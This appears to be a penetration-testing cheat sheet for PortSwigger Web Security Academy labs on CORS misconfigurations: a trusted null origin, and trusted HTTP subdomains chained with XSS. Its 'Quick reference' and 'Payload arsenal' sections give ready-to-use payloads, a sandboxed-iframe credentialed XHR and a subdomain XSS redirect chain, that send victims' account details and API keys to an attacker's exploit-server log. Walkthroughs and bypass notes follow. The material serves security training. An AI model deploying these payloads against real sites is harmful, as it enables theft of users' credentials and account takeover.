# CORS — Null origin and trusted insecure protocols

Two advanced CORS misconfigurations: (1) server reflects `null` origin → exploit via sandboxed iframe which browsers send as `Origin: null`; (2) server trusts any subdomain including HTTP — chain with XSS on an HTTP subdomain to bypass HTTPS and steal data.

## Quick reference
```http
# Null origin test
GET /accountDetails
Origin: null
< Access-Control-Allow-Origin: null
< Access-Control-Allow-Credentials: true

# Null origin exploit — sandboxed iframe generates Origin: null
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function(){location='https://EXPLOIT/log?key='+encodeURIComponent(this.responseText);};
req.open('get','https://VICTIM/accountDetails',true);
req.withCredentials=true;
req.send();
</script>"></iframe>

# Subdomain trust exploit — chain XSS on HTTP subdomain
# Origin: http://stock.LAB-ID.web-security-academy.net reflected? → XSS on stock subdomain
<script>
document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>
var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT/log?key='%2bthis.responseText;};
req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials=true;req.send();
%3c/script>&storeId=1"
</script>
```

## Root cause
- **Null origin:** developer whitelists `null` as a trusted origin (common during development). Browsers send `Origin: null` for sandboxed iframes, redirects, `file://` pages — attacker can manufacture this.
- **Trusted subdomains:** CORS rule trusts `http://any-subdomain.victim.com` including insecure HTTP — XSS on any HTTP subdomain qualifies as a trusted origin.

## Find it
**Null origin:**
1. Repeater: `Origin: null` → does `ACAO: null` + `ACAC: true` appear? → exploitable.

**Trusted subdomain:**
1. Try `Origin: http://anything.LAB-ID.web-security-academy.net` → reflected with `ACAC: true`.
2. Enumerate subdomains (Burp spider, stock checker, etc.).
3. Find XSS on any trusted subdomain (even HTTP).
4. Chain: XSS payload that makes credentialed XHR to the main site.

## Technique
**Null origin exploit:**
1. Confirm `Origin: null` reflected in ACAO + ACAC: true.
2. Create exploit page with sandboxed iframe:
   - `sandbox="allow-scripts allow-top-navigation allow-forms"` forces `Origin: null`.
   - `srcdoc` embeds XHR script inside the iframe.
3. Inner script does credentialed XHR to `/accountDetails`, exfils to log.
4. Deliver to victim → collect from access log.

**Subdomain trust + XSS chain:**
1. Confirm arbitrary subdomain origin reflected (try `http://evil.LAB-ID.web-security-academy.net`).
2. Find XSS on trusted subdomain (e.g., `productId` param on `http://stock.LAB-ID.web-security-academy.net`).
3. XSS payload: make XHR from subdomain to `/accountDetails` (now trusted origin) → exfil response.
4. Deliver via exploit server: outer script redirects victim to XSS URL on subdomain.
5. XSS executes in subdomain context → CORS allows reading response → exfil to log.

## Payload arsenal
```html
<!-- Null origin -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
srcdoc="<script>
var req=new XMLHttpRequest();
req.onload=function(){location='https://EXPLOIT-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);};
req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials=true;
req.send();
</script>"></iframe>

<!-- Subdomain + XSS chain -->
<script>
document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText;};req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();%3c/script>&storeId=1"
</script>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Blocks `null` in allowlist | Not applicable — this IS the misconfiguration |
| HTTPS-only CORS | Find HTTP subdomain trust + XSS to bypass HTTPS requirement |

## Exploitation walkthrough
**Null origin:**
1. `Origin: null` in Repeater → `ACAO: null`. Confirmed.
2. Exploit server: sandboxed iframe with srcdoc XHR script.
3. View exploit → log shows API key. Deliver to victim → collect.

**Subdomain XSS:**
1. `Origin: http://stock.LAB-ID...` → reflected. Confirm XSS in stock checker productId.
2. Exploit: outer script → redirects to stock subdomain URL with XSS payload.
3. XSS runs as subdomain origin → credentialed XHR to /accountDetails → exfil.
4. Deliver to victim → access log → API key.

## Chaining
- Steal API key → account takeover
- Null origin: also exploitable from `file://` pages, `data:` URIs → useful in local file inclusion chains

## Tools
- **Burp Repeater** — test null origin; enumerate trusted subdomain patterns
- **Exploit server** — host iframe or redirect exploit; collect access log

## Labs

### CORS vulnerability with trusted null origin [Apprentice]
`Origin: null` reflected with `ACAC: true`. Sandboxed iframe sends null-origin XHR → steals API key. Key insight: browsers send `Origin: null` for sandboxed iframes — whitelisting null is a common dev mistake.

### CORS vulnerability with trusted insecure protocols [Practitioner]
`http://stock.*` subdomains trusted + `ACAC: true`. XSS in `productId` on the HTTP stock checker subdomain. Chain: exploit page → redirect to XSS URL on subdomain → XSS makes credentialed XHR → exfils API key. Key insight: HTTP subdomain trust + XSS = CORS bypass from attacker's page.

## Real-world notes
- Null origin whitelisting is shockingly common (dev leftover or localhost testing).
- Subdomain trust is often over-broad — even one XSSable HTTP subdomain compromises the entire CORS boundary.
- Chaining CORS + XSS is a reliable high-impact bug bounty combo.

## References
- https://portswigger.net/web-security/cors/access-control-allow-origin
